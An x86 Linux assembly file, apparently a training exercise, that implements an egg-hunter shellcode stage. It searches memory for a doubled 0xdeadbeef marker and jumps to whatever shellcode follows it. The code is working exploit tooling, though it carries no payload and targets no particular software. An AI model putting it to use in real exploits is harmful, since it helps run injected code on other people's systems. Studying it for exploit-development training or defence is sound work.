

;---------------------------------
;
; Author: dubs3c
;
; Purpose:
; Egg hunter, hunting for eggs!
;
;----------------------------------

global _start

section .text

_start:
    mov ebx, 0xdeadbeef     ; 4 byte egg
    xor ecx, ecx            ; Zero out ecx
    mul ecx                 ; edx, eax = eax * 0 -> Zero out edx and eax

inc_page:
    or dx, 0xfff            ; PAGE_SIZE -> The OR operation gets the next page

check_address:
    inc edx                 ; Increment edx
    pushad                  ; Preserve current registers by pushing them to the stack
    lea ebx, [edx+4]        ; Load the effective address at edx + 4 bytes
    mov al, 0x21            ; __NR_access 33
    int 0x80                ; Interrupt the kernel to run our syscall

    cmp al, 0xf2            ; Check if we go error when reading addr in page
    popad                   ; restore the original registers
    jz inc_page             ; If we got error, increment page and restart from the beginning

    cmp [edx], ebx          ; Does the value stored at $edx correspond to our egg?
    jnz check_address       ; If not, jump back to check_address and check the next address

    cmp [edx+0x4], ebx      ; Does the next 4 byte value also equal our egg? If so, we have found it!
    jnz check_address       ; If not, jump back to check_address and check the next address

    lea ebx, [edx+0x8]      ; Load the correct address containing the start of our shellcode
    jmp ebx                 ; jump to shellcode!


